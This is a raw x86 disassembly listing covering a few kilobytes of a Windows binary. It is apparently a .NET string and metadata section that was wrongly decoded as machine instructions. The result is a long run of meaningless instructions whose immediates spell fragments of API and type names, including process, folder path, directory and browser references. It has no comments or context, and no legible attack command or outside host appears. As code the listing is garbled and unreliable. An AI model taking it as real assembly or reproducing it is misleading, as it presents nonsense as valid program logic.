  4083e8:	imul   ebp,DWORD PTR [ebp+0x65],0x64695064
  4083ef:	jae    0x408434
  4083f1:	outs   dx,DWORD PTR ds:[esi]
  4083f2:	ins    BYTE PTR es:[edi],dx
  4083f3:	ins    BYTE PTR es:[edi],dx
  4083f4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4083f9:	outs   dx,BYTE PTR ds:[esi]
  4083fa:	add    BYTE PTR [ecx+0x4f],cl
  4083fd:	jb     0x408463
  4083ff:	gs jb  0x408467
  408402:	fs inc ebp
  408404:	outs   dx,BYTE PTR ds:[esi]
  408405:	jne    0x408474
  408407:	gs jb  0x40846b
  40840a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x60]
  40840e:	xor    DWORD PTR [eax],eax
  408410:	dec    edi
  408411:	jb     0x408477
  408413:	gs jb  0x408458
  408416:	jns    0x408418
  408418:	jae    0x40847f
  40841a:	je     0x40847b
  40841c:	push   esp
  40841d:	jb     0x408480
  40841f:	arpl   WORD PTR [ebp+0x50],sp
  408422:	jb     0x408493
  408424:	arpl   WORD PTR [ebp+0x73],sp
  408427:	jae    0x40848e
  408429:	jae    0x40842b
  40842b:	addr16 gs je 0x40848e
  40842f:	push   edx
  408430:	gs jo  0x4084a2
  408433:	jb     0x4084a9
  408435:	inc    esi
  408436:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x656d61
  40843e:	cmp    al,0x44
  408440:	outs   dx,DWORD PTR ds:[esi]
  408441:	dec    esp
  408442:	imul   esi,DWORD PTR [ebx+0x74],0x73646950
  408449:	bound  ebx,QWORD PTR ds:[edi+0x5f]
  40844d:	arpl   WORD PTR [eax],ax
  40844f:	inc    ebx
  408450:	push   ebx
  408451:	and    al,0x3c
  408453:	cmp    DWORD PTR ds:[edi+0x5f],ebx
  408457:	inc    ebx
  408458:	popa   
  408459:	arpl   WORD PTR [eax+0x65],bp
  40845c:	fs inc ecx
  40845e:	outs   dx,BYTE PTR ds:[esi]
  40845f:	outs   dx,DWORD PTR ds:[esi]
  408460:	outs   dx,BYTE PTR ds:[esi]
  408461:	jns    0x4084d0
  408463:	outs   dx,DWORD PTR ds:[esi]
  408464:	jne    0x4084d9
  408466:	dec    ebp
  408467:	gs je  0x4084d2
  40846a:	outs   dx,DWORD PTR ds:[esi]
  40846b:	fs inc esp
  40846d:	gs ins BYTE PTR es:[edi],dx
  40846f:	gs addr16 popa 
  408472:	je     0x4084d9
  408474:	add    BYTE PTR fs:[ecx+0x45],cl
  408478:	outs   dx,BYTE PTR ds:[esi]
  408479:	jne    0x4084e8
  40847b:	gs jb  0x4084df
  40847e:	je     0x4084ef
  408480:	jb     0x4084e2
  408482:	xor    DWORD PTR [eax],eax
  408484:	push   ebx
  408485:	jns    0x4084fa
  408487:	je     0x4084ee
  408489:	ins    DWORD PTR es:[edi],dx
  40848a:	cs inc ebx
  40848c:	outs   dx,DWORD PTR ds:[esi]
  40848d:	ins    BYTE PTR es:[edi],dx
  40848e:	ins    BYTE PTR es:[edi],dx
  40848f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408494:	outs   dx,BYTE PTR ds:[esi]
  408495:	jae    0x408497
  408497:	dec    ecx
  408498:	inc    ebp
  408499:	outs   dx,BYTE PTR ds:[esi]
  40849a:	jne    0x408509
  40849c:	gs jb  0x408500
  40849f:	je     0x408510
  4084a1:	jb     0x4084a3
  4084a3:	addr16 gs je 0x408506
  4084a7:	inc    ebp
  4084a8:	je     0x408521
  4084aa:	push   ebx
  4084ab:	outs   dx,DWORD PTR ds:[esi]
  4084ac:	jne    0x408520
  4084ae:	arpl   WORD PTR [ebp+0x46],sp
  4084b1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x73656d61
  4084b9:	add    BYTE PTR [edx+esi*2+0x57],dl
  4084bd:	popa   
  4084be:	jb     0x40852e
  4084c0:	imul   ebp,DWORD PTR [esi+0x67],0x74656700
  4084c7:	pop    edi
  4084c8:	push   eax
  4084c9:	jb     0x40853a
  4084cb:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5367
  4084d2:	je     0x408535
  4084d4:	addr16 gs push eax
  4084d7:	popa   
  4084d8:	jb     0x40854d
  4084da:	imul   ebp,DWORD PTR [esi+0x67],0x74786554
  4084e1:	add    BYTE PTR [edi+0x65],ah
  4084e4:	je     0x408545
  4084e6:	push   eax
  4084e7:	jb     0x408558
  4084e9:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5367
  4084f0:	je     0x408553
  4084f2:	addr16 gs push eax
  4084f5:	bound  esi,QWORD PTR fs:[ebx+0x54]
  4084f9:	gs js  0x408570
  4084fc:	add    BYTE PTR [edi+0x65],ah
  4084ff:	je     0x408560
  408501:	push   eax
  408502:	jb     0x408573
  408504:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5367
  40850b:	je     0x40856e
  40850d:	addr16 gs push ebx
  408510:	jns    0x40857f
  408512:	bound  ebp,QWORD PTR [edi+0x6c]
  408515:	push   edx
  408516:	gs jae 0x408588
  408519:	ins    BYTE PTR es:[edi],dx
  40851a:	jne    0x408590
  40851c:	imul   ebp,DWORD PTR [edi+0x6e],0x74786554
  408523:	add    BYTE PTR [edi+0x65],ah
  408526:	je     0x408587
  408528:	push   eax
  408529:	jb     0x40859a
  40852b:	imul   bp,WORD PTR [ecx+ebp*2+0x6e],0x5367
  408532:	je     0x408595
  408534:	addr16 gs inc ecx
  408537:	outs   dx,BYTE PTR ds:[esi]
  408538:	popa   
  408539:	ins    BYTE PTR es:[edi],dx
  40853a:	jns    0x4085b6
  40853c:	imul   ebp,DWORD PTR [esi+0x67],0x74786554
  408543:	add    BYTE PTR [edi+0x65],ah
  408546:	je     0x4085a7
  408548:	push   ebx
  408549:	je     0x4085ac
  40854b:	je     0x4085b2
  40854d:	add    BYTE PTR [edi+0x65],ah
  408550:	je     0x4085b1
  408552:	push   eax
  408553:	gs jb  0x4085b9
  408556:	outs   dx,BYTE PTR gs:[esi]
  408558:	je     0x4085bb
  40855a:	add    BYTE PTR gs:[bx+0x65],ah
  40855f:	je     0x4085c0
  408561:	dec    ecx
  408562:	je     0x4085c9
  408564:	ins    DWORD PTR es:[edi],dx
  408565:	add    BYTE PTR [edi+ebp*2+0x75],al
  408569:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  40856d:	addr16 gs je 0x4085d0
  408571:	inc    esp
  408572:	gs jae 0x4085d8
  408575:	jb     0x4085e0
  408577:	jo     0x4085ed
  408579:	imul   ebp,DWORD PTR [edi+0x6e],0x616c4600
  408580:	addr16 jae 0x4085c4
  408583:	je     0x4085f9
  408585:	jb     0x4085f0
  408587:	bound  esi,QWORD PTR [ebp+0x74]
  40858a:	add    BYTE PTR gs:[edx+0x65],dl
  40858e:	popa   
  40858f:	fs inc ebx
  408591:	outs   dx,DWORD PTR ds:[esi]
  408592:	ins    DWORD PTR es:[edi],dx
  408593:	ins    DWORD PTR es:[edi],dx
  408594:	popa   
  408595:	outs   dx,BYTE PTR ds:[esi]
  408596:	add    BYTE PTR fs:[ecx+ebp*2+0x72],al
  40859b:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4085a0:	jns    0x4085a2
  4085a2:	inc    esp
  4085a3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4085aa:	jns    0x4085f5
  4085ac:	outs   dx,BYTE PTR ds:[esi]
  4085ad:	outs   dx,WORD PTR ds:[esi]
  4085af:	add    BYTE PTR [ebx+0x72],al
  4085b2:	gs popa 
  4085b4:	je     0x40861b
  4085b6:	inc    esp
  4085b7:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4085be:	jns    0x4085c0
  4085c0:	inc    edi
  4085c1:	gs je  0x408615
  4085c4:	jne    0x408627
  4085c6:	ins    BYTE PTR es:[edi],dx
  4085c7:	imul   esp,DWORD PTR [esi+0x69],0x54007265
  4085ce:	jb     0x408649
  4085d0:	push   eax
  4085d1:	popa   
  4085d2:	jb     0x408647
  4085d4:	gs jb  0x408637
  4085d7:	xor    DWORD PTR [eax],eax
  4085d9:	inc    edi
  4085da:	gs je  0x40862c
  4085dd:	jo     0x408653
  4085df:	imul   ebp,DWORD PTR [edi+0x6e],0x61506c61
  4085e6:	jb     0x408649
  4085e8:	ins    DWORD PTR es:[edi],dx
  4085e9:	gs je  0x408651
  4085ec:	jb     0x4085ee
  4085ee:	dec    ecx
  4085ef:	jae    0x40863f
  4085f1:	jne    0x40865f
  4085f3:	ins    BYTE PTR es:[edi],dx
  4085f4:	dec    edi
  4085f5:	jb     0x40863c
  4085f7:	ins    DWORD PTR es:[edi],dx
  4085f8:	jo     0x40866e
  4085fa:	jns    0x4085fc
  4085fc:	inc    ebp
  4085fd:	outs   dx,BYTE PTR ds:[esi]
  4085fe:	jbe    0x408669
  408600:	jb     0x408671
  408602:	outs   dx,BYTE PTR ds:[esi]
  408603:	ins    DWORD PTR es:[edi],dx
  408604:	outs   dx,BYTE PTR gs:[esi]
  408606:	je     0x408608
  408608:	addr16 gs je 0x40866b
  40860c:	inc    ebx
  40860d:	jne    0x408681
  40860f:	jb     0x408676
  408611:	outs   dx,BYTE PTR ds:[esi]
  408612:	je     0x408658
  408614:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40861b:	jns    0x40861d
  40861d:	dec    ebp
  40861e:	popa   
  40861f:	jb     0x40868c
  408621:	gs jb  0x408697
  408624:	inc    ebx
  408625:	outs   dx,DWORD PTR ds:[esi]
  408626:	outs   dx,BYTE PTR ds:[esi]
  408627:	imul   sp,WORD PTR [edi+0x0],0x6573
  40862d:	je     0x40868e
  40862f:	dec    ebp
  408630:	popa   
  408631:	jb     0x40869e
  408633:	gs jb  0x4086a9
  408636:	add    BYTE PTR [ecx+0x73],cl
  408639:	dec    esi
  40863a:	jne    0x4086a8
  40863c:	ins    BYTE PTR es:[edi],dx
  40863d:	dec    edi
  40863e:	jb     0x408697
  408640:	push   0x53657469
  408645:	jo     0x4086a8
  408647:	arpl   WORD PTR [ebp+0x0],sp
  40864a:	push   esp
  40864b:	jb     0x4086c6
  40864d:	push   eax
  40864e:	popa   
  40864f:	jb     0x4086c4
  408651:	add    BYTE PTR gs:[ebp+eiz*2+0x73],al
  408656:	gs jb  0x4086c2
  408659:	popa   
  40865a:	ins    BYTE PTR es:[edi],dx
  40865b:	imul   edi,DWORD PTR [edx+0x65],0x43734900
  408662:	outs   dx,DWORD PTR ds:[esi]
  408663:	outs   dx,BYTE PTR ds:[esi]
  408664:	imul   sp,WORD PTR [edi+0x56],0x7265
  40866a:	jae    0x4086d5
  40866c:	outs   dx,DWORD PTR ds:[esi]
  40866d:	outs   dx,BYTE PTR ds:[esi]
  40866e:	push   esi
  40866f:	popa   
  408670:	ins    BYTE PTR es:[edi],dx
  408671:	imul   esp,DWORD PTR [eax+eax*1+0x47],0x75467465
  408679:	ins    BYTE PTR es:[edi],dx
  40867a:	ins    BYTE PTR es:[edi],dx
  40867b:	push   eax
  40867c:	popa   
  40867d:	je     0x4086e7
  40867f:	add    BYTE PTR [ecx+0x6e],cl
  408682:	jbe    0x4086e5
  408684:	ins    BYTE PTR es:[edi],dx
  408685:	imul   esp,DWORD PTR [edi+ecx*2+0x70],0x74617265
  40868d:	imul   ebp,DWORD PTR [edi+0x6e],0x65637845
  408694:	jo     0x40870a
  408696:	imul   ebp,DWORD PTR [edi+0x6e],0x61725400
  40869d:	arpl   WORD PTR [ebp+0x41],sp
  4086a0:	outs   dx,BYTE PTR ds:[esi]
  4086a1:	fs push esp
  4086a3:	push   0x776f72
  4086a8:	addr16 gs je 0x40870b
  4086ac:	push   esi
  4086ad:	popa   
  4086ae:	ins    BYTE PTR es:[edi],dx
  4086af:	jne    0x408716
  4086b1:	add    BYTE PTR [edi+0x65],al
  4086b4:	je     0x408706
  4086b6:	jb     0x408727
  4086b8:	arpl   WORD PTR [ebp+0x73],sp
  4086bb:	jae    0x4086ff
  4086bd:	jns    0x408708
  4086bf:	add    BYTE PTR fs:[edi+0x65],al
  4086c3:	je     0x408715
  4086c5:	jb     0x408736
  4086c7:	arpl   WORD PTR [ebp+0x73],sp
  4086ca:	jae    0x408731
  4086cc:	jae    0x408710
  4086ce:	jns    0x40871e
  4086d0:	popa   
  4086d1:	ins    DWORD PTR es:[edi],dx
  4086d2:	add    BYTE PTR gs:[ebx+0x6f],al
  4086d6:	ins    BYTE PTR es:[edi],dx
  4086d7:	ins    BYTE PTR es:[edi],dx
  4086d8:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4086dd:	outs   dx,BYTE PTR ds:[esi]
  4086de:	push   ebx
  4086df:	gs jb  0x408758
  4086e2:	imul   esp,DWORD PTR [ebx+0x65],0x6c697455
  4086e9:	jae    0x4086eb
  4086eb:	jae    0x408752
  4086ed:	je     0x40874e
  4086ef:	push   ebp
  4086f0:	jae    0x408757
  4086f2:	inc    ebx
  4086f3:	outs   dx,DWORD PTR ds:[esi]
  4086f4:	ins    DWORD PTR es:[edi],dx
  4086f5:	ins    DWORD PTR es:[edi],dx
  4086f6:	popa   
  4086f7:	outs   dx,BYTE PTR ds:[esi]
  4086f8:	fs dec esp
  4086fa:	imul   ebp,DWORD PTR [esi+0x65],0x65646f4d
  408701:	add    BYTE PTR [ebx+0x74],dl
  408704:	popa   
  408705:	jb     0x40877b
  408707:	push   ebx
  408708:	gs jb  0x408781
  40870b:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  408712:	gs jae 0x408788
  408715:	add    BYTE PTR [ebx+0x72],al
  408718:	gs popa 
  40871a:	je     0x408781
  40871c:	inc    ebx
  40871d:	ins    BYTE PTR es:[edi],dx
  40871e:	imul   esp,DWORD PTR [ebp+0x6e],0x6c430074
  408725:	imul   esp,DWORD PTR [ebp+0x6e],0x73614274
  40872c:	gs pusha 
  40872e:	xor    DWORD PTR [eax],eax
  408730:	inc    ebx
  408731:	outs   dx,DWORD PTR ds:[esi]
  408732:	ins    DWORD PTR es:[edi],dx
  408733:	ins    DWORD PTR es:[edi],dx
  408734:	jne    0x4087a4
  408736:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40873d:	push   ebx
  40873e:	je     0x4087a1
  408740:	je     0x4087a7
  408742:	add    BYTE PTR [ebx+0x61],dl
  408745:	gs inc bx
  408748:	ins    BYTE PTR es:[edi],dx
  408749:	outs   dx,DWORD PTR ds:[esi]
  40874a:	jae    0x4087b1
  40874c:	add    BYTE PTR [edi+0x65],al
  40874f:	je     0x4087a6
  408751:	outs   dx,BYTE PTR ds:[esi]
  408752:	imul   esi,DWORD PTR [ecx+0x75],0x6d695465
  408759:	gs jae 0x4087d0
  40875c:	popa   
  40875d:	ins    DWORD PTR es:[edi],dx
  40875e:	jo     0x4087c5
  408760:	fs inc esi
  408762:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x50656d61
  40876a:	jb     0x4087d1
  40876c:	imul   di,WORD PTR [eax+0x0],0x7254
  408772:	popa   
  408773:	arpl   WORD PTR [ebp+0x50],sp
  408776:	jb     0x4087e7
  408778:	jbe    0x4087e3
  40877a:	fs gs jb 0x4087f1
  40877e:	add    BYTE PTR [edi+0x65],al
  408781:	je     0x4087cf
  408783:	outs   dx,DWORD PTR ds:[esi]
  408784:	arpl   WORD PTR [ecx+0x6c],sp
  408787:	push   esp
  408788:	jb     0x4087eb
  40878a:	arpl   WORD PTR [ebp+0x50],sp
  40878d:	jb     0x4087fe
  40878f:	jbe    0x4087fa
  408791:	fs gs jb 0x408808
  408795:	add    BYTE PTR [ebp+0x74],al
  408798:	ja     0x4087dc
  40879a:	jne    0x408802
  40879c:	data16 gs jb 0x4087f3
  4087a0:	gs je  0x408817
  4087a3:	imul   ebp,DWORD PTR [esi+0x67],0x65670073
  4087aa:	je     0x40880b
  4087ac:	dec    ebx
  4087ad:	gs jb  0x40881e
  4087b0:	gs ins BYTE PTR es:[edi],dx
  4087b2:	inc    edx
  4087b3:	jne    0x40881b
  4087b5:	data16 gs jb 0x40880c
  4087b9:	gs je  0x408830
  4087bc:	imul   ebp,DWORD PTR [esi+0x67],0x65670073
  4087c3:	je     0x408824
  4087c5:	push   ebp
  4087c6:	jae    0x40882d
  4087c8:	jb     0x40880c
  4087ca:	jne    0x408832
  4087cc:	data16 gs jb 0x408823
  4087d0:	gs je  0x408847
  4087d3:	imul   ebp,DWORD PTR [esi+0x67],0x6f430073
  4087da:	ins    BYTE PTR es:[edi],dx
  4087db:	ins    BYTE PTR es:[edi],dx
  4087dc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4087e1:	outs   dx,BYTE PTR ds:[esi]
  4087e2:	push   ebx
  4087e3:	je     0x408846
  4087e5:	jb     0x40885b
  4087e7:	push   edx
  4087e8:	gs jae 0x408860
  4087eb:	ins    BYTE PTR es:[edi],dx
  4087ec:	je     0x4087ee
  4087ee:	push   ebx
  4087ef:	je     0x408852
  4087f1:	jb     0x408867
  4087f3:	push   esp
  4087f4:	jb     0x408857
  4087f6:	arpl   WORD PTR [ecx+0x6e],bp
  4087f9:	add    BYTE PTR [bp+di+0x74],dl
  4087fd:	popa   
  4087fe:	jb     0x408874
  408800:	push   esp
  408801:	popa   
  408802:	jb     0x40886b
  408804:	gs je  0x408807
  408807:	addr16 gs je 0x40886a
  40880b:	push   esp
  40880c:	jb     0x40886f
  40880e:	arpl   WORD PTR [ebp+0x46],sp
  408811:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x73687461
  408819:	add    BYTE PTR [ebx+0x72],al
  40881c:	gs popa 
  40881e:	je     0x408885
  408820:	inc    ecx
  408821:	outs   dx,BYTE PTR ds:[esi]
  408822:	fs push ebx
  408824:	gs jb  0x408890
  408827:	popa   
  408828:	ins    BYTE PTR es:[edi],dx
  408829:	imul   edi,DWORD PTR [edx+0x65],0x6f706552
  408830:	jb     0x4088a6
  408832:	add    BYTE PTR [edi+0x65],al
  408835:	je     0x408887
  408837:	jb     0x4088a8
  408839:	arpl   WORD PTR [ebp+0x73],sp
  40883c:	jae    0x40888b
  40883e:	popa   
  40883f:	imul   ebp,DWORD PTR [esi+0x41],0x6d657373
  408846:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40884a:	push   eax
  40884b:	inc    ebp
  40884c:	dec    eax
  40884d:	gs popa 
  40884f:	fs gs jb 0x408853
  408853:	inc    edi
  408854:	gs je  0x4088a4
  408857:	popa   
  408858:	outs   dx,BYTE PTR ds:[esi]
  408859:	popa   
  40885a:	addr16 gs fs inc ecx
  40885e:	jae    0x4088d3
  408860:	gs ins DWORD PTR es:[edi],dx
  408862:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  408866:	jns    0x4088d8
  408868:	add    BYTE PTR gs:[edi+0x65],ah
  40886c:	je     0x4088cd
  40886e:	dec    ebp
  40886f:	popa   
  408870:	outs   dx,BYTE PTR ds:[esi]
  408871:	popa   
  408872:	addr16 gs fs push esp
  408876:	jns    0x4088e8
  408878:	add    BYTE PTR gs:[ebx+0x79],dl
  40887c:	jae    0x4088f2
  40887e:	gs ins DWORD PTR es:[edi],dx
  408880:	cs inc ebx
  408882:	outs   dx,DWORD PTR ds:[esi]
  408883:	fs gs inc esp
  408886:	outs   dx,DWORD PTR ds:[esi]
  408887:	ins    DWORD PTR es:[edi],dx
  408888:	cs inc ebx
  40888a:	outs   dx,DWORD PTR ds:[esi]
  40888b:	ins    DWORD PTR es:[edi],dx
  40888c:	jo     0x4088f7
  40888e:	ins    BYTE PTR es:[edi],dx
  40888f:	gs jb  0x408892
  408892:	inc    edi
  408893:	outs   dx,BYTE PTR gs:[esi]
  408895:	gs jb  0x4088f9
  408898:	je     0x4088ff
  40889a:	fs inc ebx
  40889c:	outs   dx,DWORD PTR ds:[esi]
  40889d:	fs gs inc ecx
  4088a0:	je     0x408916
  4088a2:	jb     0x40890d
  4088a4:	bound  esi,QWORD PTR [ebp+0x74]
  4088a7:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  4088ac:	jne    0x408915
  4088ae:	addr16 gs jb 0x408900
  4088b2:	outs   dx,DWORD PTR ds:[esi]
  4088b3:	outs   dx,BYTE PTR ds:[esi]
  4088b4:	push   ebp
  4088b5:	jae    0x40891c
  4088b7:	jb     0x4088fc
  4088b9:	outs   dx,DWORD PTR ds:[esi]
  4088ba:	fs gs inc ecx
  4088bd:	je     0x408933
  4088bf:	jb     0x40892a
  4088c1:	bound  esi,QWORD PTR [ebp+0x74]
  4088c4:	add    BYTE PTR gs:[edx+0x65],dl
  4088c8:	data16 gs jb 0x408931
  4088cc:	outs   dx,BYTE PTR ds:[esi]
  4088cd:	arpl   WORD PTR [ebp+0x45],sp
  4088d0:	jno    0x408947
  4088d2:	popa   
  4088d3:	ins    BYTE PTR es:[edi],dx
  4088d4:	jae    0x4088d6
  4088d6:	push   edx
  4088d7:	jne    0x408947
  4088d9:	je     0x408944
  4088db:	ins    DWORD PTR es:[edi],dx
  4088dc:	gs push esp
  4088de:	jns    0x408950
  4088e0:	gs dec eax
  4088e2:	popa   
  4088e3:	outs   dx,BYTE PTR ds:[esi]
  4088e4:	fs ins BYTE PTR es:[edi],dx
  4088e6:	add    BYTE PTR gs:[edi+0x65],al
  4088ea:	je     0x408940
  4088ec:	jns    0x40895e
  4088ee:	gs inc esi
  4088f0:	jb     0x408961
  4088f2:	ins    DWORD PTR es:[edi],dx
  4088f3:	dec    eax
  4088f4:	popa   
  4088f5:	outs   dx,BYTE PTR ds:[esi]
  4088f6:	fs ins BYTE PTR es:[edi],dx
  4088f8:	add    BYTE PTR gs:[edi+0x65],ah
  4088fc:	je     0x40895d
  4088fe:	inc    ecx
  4088ff:	jae    0x408974
  408901:	gs ins DWORD PTR es:[edi],dx
  408903:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  408907:	inc    edi
  408908:	gs je  0x40895e
  40890b:	je     0x40897f
  40890d:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  408914:	je     0x40897b
  408916:	ins    DWORD PTR es:[edi],dx
  408917:	cs inc ebx
  408919:	outs   dx,DWORD PTR ds:[esi]
  40891a:	ins    DWORD PTR es:[edi],dx
  40891b:	jo     0x40898c
  40891d:	outs   dx,BYTE PTR ds:[esi]
  40891e:	outs   dx,BYTE PTR gs:[esi]
  408920:	je     0x40896f
  408922:	outs   dx,DWORD PTR ds:[esi]
  408923:	fs gs ins BYTE PTR es:[edi],dx
  408926:	add    BYTE PTR [ebp+0x64],al
  408929:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  408931:	jae    0x408994
  408933:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  408937:	je     0x4089ad
  408939:	jb     0x4089a4
  40893b:	bound  esi,QWORD PTR [ebp+0x74]
  40893e:	add    BYTE PTR gs:[ebp+0x64],al
  408942:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x776f7242
  40894a:	jae    0x4089ad
  40894c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  408950:	je     0x4089b3
  408952:	je     0x4089b9
  408954:	add    BYTE PTR [eax],al
  408956:	add    BYTE PTR [eax],al
  408958:	add    BYTE PTR [ecx],bh
  40895a:	inc    ebx
  40895b:	add    BYTE PTR [esi+0x0],dl
  40895e:	inc    ebx
  40895f:	add    BYTE PTR [edi+0x0],ch
  408962:	ins    BYTE PTR es:[edi],dx
  408963:	add    BYTE PTR [eax+eax*1+0x65],ch
  408967:	add    BYTE PTR [ebx+0x0],ah
  40896a:	je     0x40896c
  40896c:	imul   eax,DWORD PTR [eax],0x6e006f
  408972:	inc    ebp
  408973:	add    BYTE PTR [eax+0x0],bh
  408976:	arpl   WORD PTR [eax],ax
  408978:	add    BYTE PTR gs:[eax+0x0],dh
  40897c:	je     0x40897e
  40897e:	imul   eax,DWORD PTR [eax],0x6e006f
  408984:	and    BYTE PTR [eax],al
  408986:	add    BYTE PTR gs:[edx+0x0],dh
  40898a:	jb     0x40898c
  40898c:	outs   dx,DWORD PTR ds:[esi]
  40898d:	add    BYTE PTR [edx+0x0],dh
  408990:	cmp    eax,0x502b0000
  408995:	add    BYTE PTR [ecx+0x0],ah
  408998:	jb     0x40899a
  40899a:	jae    0x40899c
  40899c:	add    BYTE PTR gs:[ebp+0x0],al
  4089a0:	js     0x4089a2
  4089a2:	arpl   WORD PTR [eax],ax
  4089a4:	add    BYTE PTR gs:[eax+0x0],dh
  4089a8:	je     0x4089aa
  4089aa:	imul   eax,DWORD PTR [eax],0x6e006f
  4089b0:	and    BYTE PTR [eax],al
  4089b2:	add    BYTE PTR gs:[edx+0x0],dh
  4089b6:	jb     0x4089b8
  4089b8:	outs   dx,DWORD PTR ds:[esi]
  4089b9:	add    BYTE PTR [edx+0x0],dh
  4089bc:	cmp    eax,0x46530000
  4089c1:	add    BYTE PTR [ecx+0x0],ah
  4089c4:	je     0x4089c6
  4089c6:	popa   
  4089c7:	add    BYTE PTR [eax+eax*1+0x20],ch
  4089cb:	add    BYTE PTR [ebp+0x0],ah
  4089ce:	jb     0x4089d0
  4089d0:	jb     0x4089d2
  4089d2:	outs   dx,DWORD PTR ds:[esi]
  4089d3:	add    BYTE PTR [edx+0x0],dh
  4089d6:	and    BYTE PTR [eax],al
  4089d8:	ja     0x4089da
  4089da:	push   0x6c006900
  4089df:	add    BYTE PTR [ebp+0x0],ah
  4089e2:	and    BYTE PTR [eax],al
  4089e4:	jb     0x4089e6
  4089e6:	jne    0x4089e8
  4089e8:	outs   dx,BYTE PTR ds:[esi]
  4089e9:	add    BYTE PTR [esi+0x0],ch
  4089ec:	imul   eax,DWORD PTR [eax],0x67006e
  4089f2:	and    BYTE PTR [eax],al
  4089f4:	je     0x4089f6
  4089f6:	push   0x20006500
  4089fb:	add    BYTE PTR [ecx+0x0],ah
  4089fe:	jo     0x408a00
  408a00:	jo     0x408a02
  408a02:	ins    BYTE PTR es:[edi],dx
  408a03:	add    BYTE PTR [ecx+0x0],ch
  408a06:	arpl   WORD PTR [eax],ax
  408a08:	popa   
  408a09:	add    BYTE PTR [eax+eax*1+0x69],dh
  408a0d:	add    BYTE PTR [edi+0x0],ch
  408a10:	outs   dx,BYTE PTR ds:[esi]
  408a11:	add    BYTE PTR [eax],al
  408a13:	aaa    
  408a14:	inc    ebp
  408a15:	add    BYTE PTR [eax+0x0],bh
  408a18:	arpl   WORD PTR [eax],ax
  408a1a:	add    BYTE PTR gs:[eax+0x0],dh
  408a1e:	je     0x408a20
  408a20:	imul   eax,DWORD PTR [eax],0x6e006f
  408a26:	and    BYTE PTR [eax],al
  408a28:	daa    
  408a29:	add    BYTE PTR [ebx+0x0],bh
  408a2c:	xor    BYTE PTR [eax],al
  408a2e:	jge    0x408a30
  408a30:	daa    
  408a31:	add    BYTE PTR [eax+eax*1],ch
  408a34:	and    BYTE PTR [eax],al
  408a36:	je     0x408a38
  408a38:	jb     0x408a3a
  408a3a:	popa   
  408a3b:	add    BYTE PTR [ebx+0x0],ah
  408a3e:	add    BYTE PTR gs:[edx],bh
  408a41:	add    BYTE PTR [eax],ah
  408a43:	add    BYTE PTR [ebx+0x0],bh
  408a46:	xor    DWORD PTR [eax],eax
  408a48:	jge    0x408a4a
  408a4a:	add    DWORD PTR [ebx+0x48],esp
  408a4d:	add    BYTE PTR [ecx+0x0],ah
  408a50:	outs   dx,BYTE PTR ds:[esi]
  408a51:	add    BYTE PTR [eax+eax*1+0x6c],ah
  408a55:	add    BYTE PTR [ebp+0x0],ah
  408a58:	inc    ebx
  408a59:	add    BYTE PTR [edi+0x0],ch
  408a5c:	ins    DWORD PTR es:[edi],dx
  408a5d:	add    BYTE PTR [ebp+0x0],ch
  408a60:	popa   
  408a61:	add    BYTE PTR [esi+0x0],ch
  408a64:	add    BYTE PTR fs:[eax+eax*1+0x69],cl
  408a69:	add    BYTE PTR [esi+0x0],ch
  408a6c:	add    BYTE PTR gs:[ebp+0x0],al
  408a70:	jb     0x408a72
  408a72:	jb     0x408a74
  408a74:	outs   dx,DWORD PTR ds:[esi]
  408a75:	add    BYTE PTR [edx+0x0],dh
  408a78:	and    BYTE PTR [eax],al
  408a7a:	arpl   WORD PTR [eax],ax
  408a7c:	popa   
  408a7d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  408a81:	add    BYTE PTR [ebp+0x0],ah
  408a84:	add    BYTE PTR fs:[eax],ah
  408a87:	add    BYTE PTR [edx+0x0],ah
  408a8a:	jne    0x408a8c
  408a8c:	je     0x408a8e
  408a8e:	and    BYTE PTR [eax],al
  408a90:	outs   dx,BYTE PTR ds:[esi]
  408a91:	add    BYTE PTR [edi+0x0],ch
  408a94:	and    BYTE PTR [eax],al
  408a96:	add    BYTE PTR gs:[edx+0x0],dh
  408a9a:	jb     0x408a9c
  408a9c:	outs   dx,DWORD PTR ds:[esi]
  408a9d:	add    BYTE PTR [edx+0x0],dh
  408aa0:	jae    0x408aa2
  408aa2:	and    BYTE PTR [eax],al
  408aa4:	data16 add BYTE PTR [edi+0x0],ch
  408aa8:	jne    0x408aaa
  408aaa:	outs   dx,BYTE PTR ds:[esi]
  408aab:	add    BYTE PTR [eax+eax*1+0x0],ah
  408aaf:	or     edi,DWORD PTR [ebx+0x0]
  408ab2:	xor    BYTE PTR [eax],al
  408ab4:	jge    0x408ab6
  408ab6:	and    BYTE PTR [eax],al
  408ab8:	and    BYTE PTR [eax],al
  408aba:	add    BYTE PTR [ebx],cl
  408abc:	jnp    0x408abe
  408abe:	xor    BYTE PTR [eax],al
  408ac0:	jge    0x408ac2
  408ac2:	sub    al,0x0
  408ac4:	and    BYTE PTR [eax],al
  408ac6:	add    BYTE PTR [edi],dh
  408ac8:	push   ebp
